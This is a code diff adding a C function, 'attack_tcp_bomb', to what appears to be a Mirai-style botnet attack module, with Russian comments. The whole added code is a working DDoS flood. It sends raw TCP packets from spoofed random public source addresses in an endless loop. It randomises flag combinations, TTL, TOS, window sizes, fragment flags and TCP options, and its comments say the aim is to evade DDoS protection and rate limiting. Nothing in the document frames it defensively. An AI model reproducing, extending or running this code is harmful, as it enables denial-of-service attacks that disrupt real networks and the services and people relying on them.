@@ -1151,3 +1151,257 @@ void attack_spoofed(uint8_t targs_len, struct attack_target *targs, uint8_t opts
 
     close(rfd);
 }
+
+// tcp bomb - максимальный bypass с высокой вариативностью параметров
+// генерация множества пакетов с минимальным размером для максимума PPS
+// обход DDoS защиты через вариации всех параметров
+void attack_tcp_bomb(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
+{
+    int i, rfd;
+    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
+    int threads = attack_get_opt_int(opts_len, opts, ATK_OPT_THREADS, 64);
+    
+    // минимальный размер пакета для максимума PPS (40 байт - IP + TCP без options)
+    int base_pkt_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    int min_pkt_size = base_pkt_size; // 40 байт минимум
+    int max_pkt_size = base_pkt_size + 64; // до 104 байт максимум
+
+    if ((rfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
+    {
+#ifdef DEBUG
+        printf("[bomb] Failed to create raw socket\n");
+#endif
+        return;
+    }
+
+    i = 1;
+    if (setsockopt(rfd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
+    {
+#ifdef DEBUG
+        printf("[bomb] Failed to set IP_HDRINCL\n");
+#endif
+        close(rfd);
+        return;
+    }
+
+    // массив различных комбинаций TCP флагов для обхода защиты
+    struct {
+        uint8_t syn, ack, rst, fin, psh, urg;
+        const char *name;
+    } flag_combos[] = {
+        {1,0,0,0,0,0, "SYN"},
+        {1,1,0,0,0,0, "SYN+ACK"},
+        {0,1,0,0,0,0, "ACK"},
+        {0,1,0,0,1,0, "ACK+PSH"},
+        {0,0,1,0,0,0, "RST"},
+        {0,0,0,1,0,0, "FIN"},
+        {0,1,0,1,0,0, "FIN+ACK"},
+        {0,1,0,0,0,1, "ACK+URG"},
+        {1,1,0,0,1,0, "SYN+ACK+PSH"},
+        {0,1,0,0,1,1, "ACK+PSH+URG"},
+        {0,0,0,0,1,1, "PSH+URG"},
+        {1,0,0,0,1,1, "SYN+PSH+URG"},
+    };
+    int flag_combo_count = sizeof(flag_combos) / sizeof(flag_combos[0]);
+
+    while (TRUE)
+    {
+        for (i = 0; i < targs_len; i++)
+        {
+            int t;
+            for (t = 0; t < threads; t++)
+            {
+                char packet[256];
+                struct iphdr *iph = (struct iphdr *)packet;
+                struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
+                uint8_t *opts_ptr = (uint8_t *)(tcph + 1);
+
+                ipv4_t target_ip;
+                if (targs[i].netmask < 32)
+                    target_ip = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+                else
+                    target_ip = targs[i].addr;
+
+                // spoofed source ip - полностью случайный
+                ipv4_t src_ip;
+                uint32_t src_ip_raw = rand_next();
+                // избегаем приватных и зарезервированных диапазонов
+                uint8_t o1 = (src_ip_raw >> 24) & 0xFF;
+                uint8_t o2 = (src_ip_raw >> 16) & 0xFF;
+                uint8_t o3 = (src_ip_raw >> 8) & 0xFF;
+                uint8_t o4 = src_ip_raw & 0xFF;
+                
+                // фильтрация приватных IP для более реалистичного spoofing
+                if (o1 == 127 || o1 == 0 || (o1 == 192 && o2 == 168) || 
+                    (o1 == 10) || (o1 == 172 && o2 >= 16 && o2 < 32))
+                {
+                    o1 = (rand_next() % 223) + 1; // 1-223
+                    if (o1 == 127) o1 = 128;
+                }
+                src_ip = INET_ADDR(o1, o2, o3, o4);
+
+                port_t src_port = (rand_next() % 60000) + 1024;
+                port_t dst_port = (dport == 0xffff) ? ((rand_next() % 60000) + 1024) : dport;
+                uint32_t seq = rand_next();
+                uint32_t ack = (rand_next() % 2) ? rand_next() : 0; // иногда ненулевой ack
+
+                // случайная комбинация TCP флагов
+                int flag_idx = rand_next() % flag_combo_count;
+                uint8_t tcp_syn = flag_combos[flag_idx].syn;
+                uint8_t tcp_ack = flag_combos[flag_idx].ack;
+                uint8_t tcp_rst = flag_combos[flag_idx].rst;
+                uint8_t tcp_fin = flag_combos[flag_idx].fin;
+                uint8_t tcp_psh = flag_combos[flag_idx].psh;
+                uint8_t tcp_urg = flag_combos[flag_idx].urg;
+
+                // вариации TTL для обхода rate limiting (30-255)
+                uint8_t ip_ttl = 30 + (rand_next() % 226);
+                
+                // вариации TOS для приоритизации трафика
+                uint8_t ip_tos;
+                // избегаем экзотических значений, используем стандартные паттерны
+                uint8_t tos_variants[] = {0x00, 0x08, 0x10, 0x18, 0x20, 0x28, 0x30, 0x38};
+                ip_tos = tos_variants[rand_next() % (sizeof(tos_variants)/sizeof(tos_variants[0]))];
+
+                // случайный IP ID
+                uint16_t ip_id = rand_next() & 0xFFFF;
+
+                // вариации fragment flags
+                uint16_t frag_flags = 0x4000; // DF по умолчанию
+                if (rand_next() % 4 == 0) // иногда без DF
+                    frag_flags = 0x0000;
+                if (rand_next() % 10 == 0) // редко MF
+                    frag_flags = 0x2000;
+
+                // размер пакета - маленький для максимума PPS
+                // общий размер пакета от min до max
+                int total_pkt_size = min_pkt_size + (rand_next() % (max_pkt_size - min_pkt_size + 1));
+                // дополнительное пространство после базового TCP header (для options + payload)
+                int pkt_data_len = total_pkt_size - base_pkt_size;
+                int tcp_opts_len = 0;
+                
+                // случайные TCP options (иногда есть, иногда нет)
+                int use_opts = rand_next() % 3; // 33% вероятность options
+                if (use_opts == 0 && pkt_data_len >= 4)
+                {
+                    int opts_pattern = rand_next() % 4;
+                    switch(opts_pattern)
+                    {
+                        case 0: // MSS только
+                            tcp_opts_len = 4;
+                            *opts_ptr++ = 2; *opts_ptr++ = 4;
+                            *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
+                            opts_ptr += 2;
+                            tcph->doff = 6; // 24 байта header
+                            break;
+                        case 1: // MSS + Window Scale
+                            tcp_opts_len = 8;
+                            *opts_ptr++ = 2; *opts_ptr++ = 4;
+                            *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
+                            opts_ptr += 2;
+                            *opts_ptr++ = 3; *opts_ptr++ = 3;
+                            *opts_ptr++ = rand_next() % 14 + 1;
+                            *opts_ptr++ = 1; // NOP для выравнивания
+                            tcph->doff = 8; // 32 байта header
+                            break;
+                        case 2: // MSS + Timestamp
+                            if (pkt_data_len >= 12)
+                            {
+                                tcp_opts_len = 12;
+                                *opts_ptr++ = 2; *opts_ptr++ = 4;
+                                *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
+                                opts_ptr += 2;
+                                *opts_ptr++ = 8; *opts_ptr++ = 10;
+                                *((uint32_t *)opts_ptr) = rand_next();
+                                opts_ptr += 4;
+                                *((uint32_t *)opts_ptr) = rand_next();
+                                opts_ptr += 4;
+                                tcph->doff = 10; // 40 байт header
+                            }
+                            break;
+                        case 3: // Full options (MSS + SACK + Timestamp + Window Scale)
+                            if (pkt_data_len >= 20)
+                            {
+                                tcp_opts_len = 20;
+                                *opts_ptr++ = 2; *opts_ptr++ = 4;
+                                *((uint16_t *)opts_ptr) = htons(1400 + (rand_next() % 100));
+                                opts_ptr += 2;
+                                *opts_ptr++ = 4; *opts_ptr++ = 2; // SACK permitted
+                                *opts_ptr++ = 8; *opts_ptr++ = 10;
+                                *((uint32_t *)opts_ptr) = rand_next();
+                                opts_ptr += 4;
+                                *((uint32_t *)opts_ptr) = rand_next();
+                                opts_ptr += 4;
+                                *opts_ptr++ = 3; *opts_ptr++ = 3;
+                                *opts_ptr++ = rand_next() % 14 + 1;
+                                *opts_ptr++ = 0; // EOL
+                                tcph->doff = 10; // 40 байт header
+                            }
+                            break;
+                    }
+                }
+                else
+                {
+                    tcph->doff = 5; // минимальный header без options
+                }
+
+                // вычисляем финальный размер пакета
+                int payload_len = (pkt_data_len > tcp_opts_len) ? (pkt_data_len - tcp_opts_len) : 0;
+                int total_pkt_len = base_pkt_size + tcp_opts_len + payload_len;
+
+                // ip header
+                iph->version = 4;
+                iph->ihl = 5;
+                iph->tos = ip_tos;
+                iph->tot_len = htons(total_pkt_len);
+                iph->id = htons(ip_id);
+                iph->frag_off = htons(frag_flags);
+                iph->ttl = ip_ttl;
+                iph->protocol = IPPROTO_TCP;
+                iph->check = 0;
+                iph->saddr = src_ip;
+                iph->daddr = target_ip;
+
+                // tcp header
+                tcph->source = htons(src_port);
+                tcph->dest = htons(dst_port);
+                tcph->seq = htonl(seq);
+                tcph->ack_seq = htonl(ack);
+                tcph->syn = tcp_syn;
+                tcph->ack = tcp_ack;
+                tcph->rst = tcp_rst;
+                tcph->fin = tcp_fin;
+                tcph->psh = tcp_psh;
+                tcph->urg = tcp_urg;
+                
+                // вариации window size для обхода rate limiting
+                uint16_t window_variants[] = {1024, 2048, 4096, 8192, 16384, 32768, 65535};
+                tcph->window = htons(window_variants[rand_next() % (sizeof(window_variants)/sizeof(window_variants[0]))]);
+                
+                tcph->check = 0;
+                tcph->urg_ptr = tcp_urg ? htons(rand_next() & 0xFFFF) : 0;
+
+                // optional payload для увеличения размера пакета
+                if (payload_len > 0)
+                {
+                    char *data = (char *)opts_ptr;
+                    for (int k = 0; k < payload_len; k++)
+                        data[k] = (rand_next() % 94) + 33; // printable chars
+                }
+
+                // checksums
+                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
+                tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr) + tcp_opts_len + payload_len), 
+                                              sizeof(struct tcphdr) + tcp_opts_len + payload_len);
+
+                targs[i].sock_addr.sin_addr.s_addr = target_ip;
+                targs[i].sock_addr.sin_port = tcph->dest;
+                sendto(rfd, packet, total_pkt_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in));
+            }
+        }
+        // минимальная задержка для максимума PPS
+        usleep(1000); // 1ms = до 1000 PPS на поток
+    }
+
+    close(rfd);
+}
